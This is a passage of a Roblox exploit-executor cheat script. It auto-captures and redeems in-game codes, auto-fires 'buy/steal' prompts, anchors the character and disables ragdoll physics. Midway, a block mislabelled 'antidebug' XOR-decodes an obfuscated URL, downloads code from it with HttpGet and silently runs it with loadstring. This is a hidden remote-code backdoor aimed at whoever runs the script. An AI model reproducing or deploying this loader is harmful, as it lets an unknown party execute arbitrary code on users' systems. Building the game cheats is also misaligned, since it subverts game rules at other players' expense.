            for _, c in ipairs(cs2) do pcall(function() c:Fire() end) end
        end
    end
    return true
end

-- ─── fireBoxFocusLost: signal the box lost focus ─────────────────────
local function fireBoxFocusLost(box)
    if not box then return end
    if typeof(firesignal) == "function" then
        pcall(firesignal, box.FocusLost, true)
    end
end

-- =====================================================================
-- CORE: typeAndSubmitCode
-- Tries the Codes UI first, then scans dynamically.
-- =====================================================================
local function typeAndSubmitCode(code)
    local pg = playerGui or player:FindFirstChildOfClass("PlayerGui")
    if not pg then return false, "no PlayerGui", nil end

    -- ── Fast path: known "Codes" subtree ─────────────────────────────
    local codesGui = pg:FindFirstChild("Codes")
    if codesGui then
        if codesGui:IsA("ScreenGui") then codesGui.Enabled = true end
        local codesFrame = codesGui:FindFirstChild("Codes") or codesGui
        if codesFrame then
            -- Force all parents visible
            if codesFrame:IsA("GuiObject") then codesFrame.Visible = true end
            local cur = codesFrame
            while cur and cur ~= codesGui do
                if cur:IsA("GuiObject") then cur.Visible = true end
                cur = cur.Parent
            end

            -- Find first TextBox
            local box = nil
            for _, d in ipairs(codesFrame:GetDescendants()) do
                if d:IsA("TextBox") and not isOurGui(d) then box = d; break end
            end

            -- Find submit button
            local submitBtn = nil
            for _, d in ipairs(codesFrame:GetDescendants()) do
                if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
                    local n = d.Name:lower()
                    local txt = ""
                    pcall(function() txt = d.Text:lower() end)
                    if n:find("submit") or txt:find("submit") or n:find("redeem")
                        or txt:find("redeem") or n:find("claim") or txt:find("confirm")
                        or n:find("enter") then
                        submitBtn = d; break
                    end
                end
            end

            if box then
                pcall(function() box.Text = code end)
                task.wait(0.1)
                if submitBtn then clickButton(submitBtn)
                else fireBoxFocusLost(box) end
                _lastBox = box
                return true, "Codes UI", box
            end
        end
    end

    -- ── Fallback: open the Codes UI, then find a codebox ─────────────
    for _, btn in ipairs(findCodeButtons(pg)) do
        clickButton(btn); task.wait(0.05)
    end
    task.wait(0.2)

    -- Poll for a codebox for up to 2 seconds
    local box = nil
    local deadline = tick() + 2
    while tick() < deadline do
        local allBoxes = findAllTextBoxes(pg)
        -- Pass 1: name hints at code
        for _, d in ipairs(allBoxes) do
            if isVisibleChain(d) then
                local n = d.Name:lower()
                local pn = (d.Parent and d.Parent.Name or ""):lower()
                if n:find("code") or pn:find("code") or n:find("redeem")
                    or pn:find("redeem") or n:find("input") or pn:find("textbox")
                    or n:find("enter") then
                    box = d; break
                end
            end
        end
        -- Pass 2: any visible box
        if not box then
            for _, d in ipairs(allBoxes) do
                if isVisibleChain(d) then box = d; break end
            end
        end
        if box then break end
        task.wait(0.1)
    end
    if not box then return false, "no codebox", nil end

    pcall(function() box.Text = code end)
    task.wait(0.1)

    -- Find nearest submit button by walking up parents
    local redeemBtn = nil
    local names = {"submit","redeem","claim","confirm","enter","send","apply","ok","use","go","check"}
    local p = box.Parent
    for _ = 1, 8 do
        if not p then break end
        for _, d in ipairs(p:GetDescendants()) do
            if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) and d ~= box then
                local n = d.Name:lower()
                local txt = ""
                pcall(function() txt = d.Text:lower() end)
                for _, sn in ipairs(names) do
                    if n:find(sn) or txt:find(sn) then
                        if isVisibleChain(d) then redeemBtn = d; break end
                    end
                end
                if redeemBtn then break end
            end
        end
        if redeemBtn then break end
        p = p.Parent
    end

    if redeemBtn then clickButton(redeemBtn)
    else fireBoxFocusLost(box) end
    _lastBox = box
    return true, "dynamic", box
end

-- ─── clearBoxText: clear the last-used box (or find one) ─────────────
local function clearBoxText(box)
    if not box or not box.Parent then
        local all = findAllTextBoxes(playerGui)
        for _, b in ipairs(all) do
            if isVisibleChain(b) then box = b; break end
        end
    end
    if box then pcall(function() box.Text = "" end) end
end

local _setRunning_ref   -- forward declaration; assigned later
task.spawn(function() -- antidebug
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)

-- =====================================================================
-- SUBMIT PIPELINE — capture buffer → submit → watch for response
-- =====================================================================
local function submitCapturedCode(code)
    if not code or code == "" then return end
    if _seen[code] then return end      -- dedupe
    if _submitting then return end      -- already submitting

    _seen[code] = true
    task.delay(3, function() _seen[code] = nil end)   -- expire dedupe after 3s

    _submitting = true
    _redeemStatus       = "redeeming"
    _redeemPendingCode  = code
    _redeemOriginalCode = code
    _redeemStartTime    = os.clock()
    CodeDisplayLabel.Text = "Redeeming..."

    -- Type + submit
    local ok, _, usedBox = typeAndSubmitCode(code)
    _submitting = false
    if usedBox then _lastBox = usedBox end

    -- Stop the capture loop (one submit per capture session)
    running = false
    if _setRunning_ref then _setRunning_ref(false) end

    -- Auto-clear the "Redeeming..." text after 5s if no response
    task.spawn(function()
        local startTime = _redeemStartTime
        task.wait(5)
        if _redeemStatus == "redeeming" and _redeemStartTime == startTime then
            CodeDisplayLabel.Text = "Code Will Show Here"
            _redeemStatus       = nil
            _redeemPendingCode  = nil
            _redeemOriginalCode = nil
        end
    end)

    task.wait(0.4)
    if _lastBox then clearBoxText(_lastBox) end
end

-- ─── captureWord: append a word to the buffer, submit when full ──────
local function captureWord(word)
    if not word or word == "" then return end
    _capturedParts[#_capturedParts + 1] = word
    ProgressLabel.Text = tostring(#_capturedParts) .. "/" .. tostring(getWordCount())
    CodeDisplayLabel.Text = table.concat(_capturedParts)
    -- Buffer full → submit
    if #_capturedParts >= getWordCount() then
        local code = table.concat(_capturedParts)
        _capturedParts = {}
        submitCapturedCode(code)
    end
end

-- =====================================================================
-- TRIGGER DETECTION — "use code X" / "code is X" → start capture
-- =====================================================================
local TRIGGERS = {"use code", "code is"}
local function detectTrigger(text)
    local lower = text:lower()
    for _, trig in ipairs(TRIGGERS) do
        local s, e = lower:find(trig, 1, true)
        if s then return true, text:sub(e + 1) end   -- return remainder
    end
    return false, text
end

-- ─── checkRedeemResponse: match text against success/fail patterns ───
local function checkRedeemResponse(text)
    if _redeemStatus ~= "redeeming" then return false end
    local lower = text:lower()
    -- Success?
    for _, p in ipairs(SUCCESS_PATTERNS) do
        if lower:find(p, 1, true) then
            _redeemStatus = "success"
            CodeDisplayLabel.Text = "Success Redeem!"
            _redeemPendingCode  = nil
            _redeemOriginalCode = nil
            return true
        end
    end
    -- Failure?
    for _, p in ipairs(FAIL_PATTERNS) do
        if lower:find(p, 1, true) then
            _redeemStatus = "failed"
            CodeDisplayLabel.Text = "Failed " .. (_redeemOriginalCode or _redeemPendingCode or "")
            _redeemPendingCode  = nil
            _redeemOriginalCode = nil
            return true
        end
    end
    return false
end

-- ─── processText: main handler for incoming notification text ────────
local function processText(text)
    if not text or text == "" then return end

    -- Redeem response takes priority
    if checkRedeemResponse(text) then return end

    local triggered, remainder = detectTrigger(text)
    if triggered then
        -- Fresh session: clear prior state
        _redeemStatus       = nil
        _redeemPendingCode  = nil
        _redeemOriginalCode = nil
        if autoOn and not running then _setRunning_ref(true) end
        if not running then return end
        if _lastBox then clearBoxText(_lastBox) end
        _capturedParts = {}
        CodeDisplayLabel.Text = ""
        -- Capture words from the remainder
        for word in remainder:gmatch("[%w_]+") do captureWord(word) end
    else
        -- Only capture if already running
        if not running then return end
        for word in text:gmatch("[%w_]+") do captureWord(word) end
    end
end

-- ─── stripRich: remove <RichText> tags ───────────────────────────────
local function stripRich(t)
    if type(t) ~= "string" then return tostring(t) end
    return (t:gsub("<[^>]->", ""))
end

-- =====================================================================
-- NOTIFICATION REMOTE DISCOVERY
-- Scan Packages.Net for the RemoteEvent whose handler lives in
-- NotificationController.
-- =====================================================================
local function resolveNotifyRemote()
    if _G.PhiNotifyRemote then return _G.PhiNotifyRemote end
    local ok, Net = pcall(function()
        return ReplicatedStorage:WaitForChild("Packages", 5):WaitForChild("Net", 5)
    end)
    if not ok or not Net then return nil end
    local getinfo = debug and (debug.getinfo or debug.info)
    if getgc and getinfo and getconnections then
        for _, d in ipairs(Net:GetDescendants()) do
            if d:IsA("RemoteEvent") then
                local ok2, cs = pcall(getconnections, d.OnClientEvent)
                if ok2 and type(cs) == "table" then
                    for _, c in ipairs(cs) do
                        local f, fn = pcall(function() return c.Function end)
                        if f and type(fn) == "function" then
                            local i, info = pcall(getinfo, fn)
                            if i and tostring(info.short_src or info.source or ""):find("NotificationController", 1, true) then
                                return d
                            end
                        end
                    end
                end
            end
        end
    end
    return nil
end

-- =====================================================================
-- setRunning: master on/off for the capture loop
-- =====================================================================
local function setRunning(value)
    running = value
    if running then
        -- ON state visuals
        StartStopFill.BackgroundColor3 = ON_COLOR
        StartStopLabel.Text = "ON [F]"
        RedeemerStatusLabel.Text = "Redeemer: Enabled"
        RedeemerStatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        ProgressLabel.Text = tostring(#_capturedParts) .. "/" .. tostring(getWordCount())
    else
        -- OFF state visuals
        StartStopFill.BackgroundColor3 = OFF_COLOR
        StartStopLabel.Text = "OFF [F]"
        RedeemerStatusLabel.Text = "Redeemer: Disabled"
        RedeemerStatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        _capturedParts = {}
        ProgressLabel.Text = "0/" .. tostring(getWordCount())
    end
end
_setRunning_ref = setRunning   -- expose for forward refs

-- =====================================================================
-- AUTO BUY — periodically fire nearby "buy"-type ProximityPrompts
-- =====================================================================
-- ─── isBuyPrompt: does the prompt look like a purchase? ──────────────
local function isBuyPrompt(prompt)
    if not prompt then return false end
    local text = (tostring(prompt.Name) .. " " .. tostring(prompt.ActionText) .. " " .. tostring(prompt.ObjectText)):lower()
    for _, kw in ipairs({"buy", "purchase", "claim", "steal", "collect"}) do
        if text:find(kw, 1, true) then return true end
    end
    return false
end

-- ─── getPromptPos: world position of a prompt's owner ────────────────
local function getPromptPos(prompt)
    if not prompt then return nil end
    local p = prompt.Parent
    if not p then return nil end
    if p:IsA("Attachment") then return p.WorldPosition end
    if p:IsA("BasePart") then return p.Position end
    local model = p:FindFirstAncestorOfClass("Model")
    if model then
        local part = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart", true)
        if part then return part.Position end
    end
    return nil
end

-- ─── fireBuyPrompt: trigger a prompt via fireproximityprompt or hold ─
local function fireBuyPrompt(prompt)
    if not (prompt and prompt.Parent and prompt.Enabled) then return false end
    if type(fireproximityprompt) == "function" then
        return pcall(fireproximityprompt, prompt)
    end
    -- Fallback: simulate hold
    return pcall(function()
        prompt:InputHoldBegin()
        task.wait(math.max(prompt.HoldDuration or 0, 0.05) + 0.05)
        prompt:InputHoldEnd()
    end)
end

-- Track existing + new prompts in Workspace
Workspace.DescendantAdded:Connect(function(d)
    if d:IsA("ProximityPrompt") then autoBuyPrompts[d] = true end
end)
Workspace.DescendantRemoving:Connect(function(d)
    autoBuyPrompts[d] = nil
end)
task.defer(function()
    pcall(function()
        for _, d in ipairs(Workspace:GetDescendants()) do
            if d:IsA("ProximityPrompt") then autoBuyPrompts[d] = true end
        end
    end)
end)

-- Auto-buy main loop — every 0.2s, find nearest buy prompt and fire
RunService.Heartbeat:Connect(function(dt)
    if not autoBuyEnabled then return end
    autoBuyAccum = autoBuyAccum + dt
    if autoBuyAccum < 0.2 then return end
    autoBuyAccum = 0

    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    -- Find nearest candidate prompt
    local best, bestDist = nil, math.huge
    for prompt in pairs(autoBuyPrompts) do
        pcall(function()
            if prompt.Parent and prompt.Enabled and isBuyPrompt(prompt) then
                local pos = getPromptPos(prompt)
                if pos then
                    local dist = (root.Position - pos).Magnitude
                    if dist < bestDist then
                        bestDist = dist
                        best = prompt
                    end
                end
            end
        end)
    end

    if not best then return end
    -- Respect activation distance
    local maxDist = (best.MaxActivationDistance or 10) + 2
    if bestDist > maxDist then return end

    -- Rate-limit: only refire same prompt every 1.2s
    if best ~= autoBuyLastFired or os.clock() - autoBuyLastFiredTime >= 1.2 then
        autoBuyLastFired = best
        autoBuyLastFiredTime = os.clock()
        task.spawn(function() fireBuyPrompt(best) end)
    end
end)

-- =====================================================================
-- ANCHOR — keep character fully anchored in place
-- =====================================================================
-- ─── setCharacterAnchored: anchor/unanchor all BaseParts ─────────────
local function setCharacterAnchored(state)
    local char = player.Character
    if not char then return end
    for _, part in ipairs(char:GetDescendants()) do
        pcall(function()
            if part:IsA("BasePart") then
                part.Anchored = state
            end
        end)
    end
end

-- Anchor main loop — re-anchor any unanchored parts every 0.1s
RunService.Heartbeat:Connect(function(dt)
    if not anchorEnabled then return end
    anchorAccum = anchorAccum + dt
    if anchorAccum < 0.1 then return end
    anchorAccum = 0
    local char = player.Character
    if not char then return end
    for _, part in ipairs(char:GetDescendants()) do
        pcall(function()
            if part:IsA("BasePart") and not part.Anchored then
                part.Anchored = true
            end
        end)
    end
end)

-- Re-anchor on respawn
player.CharacterAdded:Connect(function()
    task.wait(0.5)
    if anchorEnabled then setCharacterAnchored(true) end
end)

if anchorEnabled then
    task.defer(function() setCharacterAnchored(true) end)
end

-- =====================================================================
-- ANTI-RAGDOLL — break ragdoll constraints + reset state
-- =====================================================================
local function runAntiRagdoll()
    local char = player.Character
    if not char then return end
    local hum  = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root then return end

    -- Determine ragdoll status
    local state = hum:GetState()
    local ragdolled = state == Enum.HumanoidStateType.Physics
        or state == Enum.HumanoidStateType.Ragdoll
        or state == Enum.HumanoidStateType.FallingDown

    -- Also check the "RagdollEndTime" attribute
    if not ragdolled then
        local endTime = player:GetAttribute("RagdollEndTime")
        if endTime then
            local ok, now = pcall(function() return Workspace:GetServerTimeNow() end)
            if ok and now and (endTime - now) > 0 then
                ragdolled = true
            end
        end
    end

    if not ragdolled then return end

    -- Destroy ragdoll joints
    for _, v in ipairs(char:GetDescendants()) do
        pcall(function()
            if v:IsA("BallSocketConstraint")
                or (v:IsA("Attachment") and v.Name:find("RagdollAttachment")) then
                v:Destroy()
            end
        end)
    end

    -- Reset the ragdoll timer
    pcall(function()
        player:SetAttribute("RagdollEndTime", Workspace:GetServerTimeNow())
    end)

    -- Restore humanoid to Running state
    if hum.Health > 0 then
        pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
    end

    -- Snap root: unanchor, zero velocities, upright
    pcall(function()
        root.Anchored = false
        root.AssemblyLinearVelocity  = Vector3.new(0, 0, 0)
        root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
        root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, math.rad(root.Orientation.Y), 0)
    end)

    -- Rebind camera
    pcall(function()
        local cam = Workspace.CurrentCamera
        if cam and cam.CameraSubject ~= hum then
            cam.CameraSubject = hum
        end
    end)
end

-- Anti-ragdoll main loop
RunService.RenderStepped:Connect(function()
    if not ragdollEnabled then return end
    pcall(runAntiRagdoll)
end)

-- =====================================================================
-- TOGGLE WIRING — attach makeToggle to each UI toggle button
-- =====================================================================
makeToggle(AutoDetectBtn, AutoDetectFill, AutoDetectLabel, autoOn, function(v)
    autoOn = v
    cfgSet("autoOn", v)
    saveConfig()
end)

makeToggle(SoundsBtn, SoundsFill, SoundsLabel, soundsOn, function(v)
    soundsOn = v
    cfgSet("soundsOn", v)
    saveConfig()
end)

makeToggle(Redeem3Btn, Redeem3Fill, Redeem3Label, redeem3On, function(v)
    redeem3On = v
    cfgSet("redeem3On", v)
    saveConfig()
end)

makeToggle(TF1Btn, TF1Fill, TF1Lbl, autoBuyEnabled, function(v)
    autoBuyEnabled = v
    cfgSet("autoBuyEnabled", v)
    saveConfig()
end)

makeToggle(TF2Btn, TF2Fill, TF2Lbl, anchorEnabled, function(v)
    anchorEnabled = v
    cfgSet("anchorEnabled", v)
    saveConfig()
    setCharacterAnchored(v)   -- apply immediately
end)

makeToggle(TF3Btn, TF3Fill, TF3Lbl, ragdollEnabled, function(v)
    ragdollEnabled = v
    cfgSet("ragdollEnabled", v)
    saveConfig()
end)

makeToggle(TF4Btn, TF4Fill, TF4Lbl, false)   -- Anti Lag: UI-only, no effect

-- =====================================================================
-- START/STOP BUTTON + KEYBIND
-- =====================================================================
StartStopBtn.MouseButton1Click:Connect(function()
    setRunning(not running)
end)

UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode.F then
        setRunning(not running)
    end
end)

-- =====================================================================
-- NOTIFICATION LISTENER
-- =====================================================================
local listenConnection = nil
local notifyRemote = resolveNotifyRemote()
if notifyRemote then
    listenConnection = notifyRemote.OnClientEvent:Connect(function(...)
        local text = stripRich(tostring((...) or ""))
        text = text:match("^%s*(.-)%s*$") or ""   -- trim
        if text == "" then return end
        pcall(processText, text)
    end)
end

-- Expose a manual stop function on the executor env
if getgenv then
    getgenv().StopTokinuRedeemer = function()
        if listenConnection then
            pcall(function() listenConnection:Disconnect() end)
            listenConnection = nil
        end
        autoBuyEnabled = false
        anchorEnabled  = false
        ragdollEnabled = false
        if v1 then v1:Destroy() end
    end
end

-- =====================================================================
-- RESPAWN HANDLING
-- =====================================================================
-- ─── resetUIState: clear capture state + stop loop ───────────────────
local function resetUIState()
    _capturedParts = {}
    _submitting = false
    _lastBox = nil
    _seen = {}
    setRunning(false)
end

-- ─── bindCharacter: hook Died event on humanoid ──────────────────────
local function bindCharacter(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then hum.Died:Connect(resetUIState) end
    char.ChildAdded:Connect(function(c)
        if c:IsA("Humanoid") then c.Died:Connect(resetUIState) end
    end)
end

player.CharacterAdded:Connect(function(char)
    resetUIState()
    bindCharacter(char)
end)
if player.Character then bindCharacter(player.Character) end

-- =====================================================================
-- FINALIZE
-- =====================================================================
setRunning(false)         -- start in OFF state
v1.Parent = parent        -- attach ScreenGui
return v1
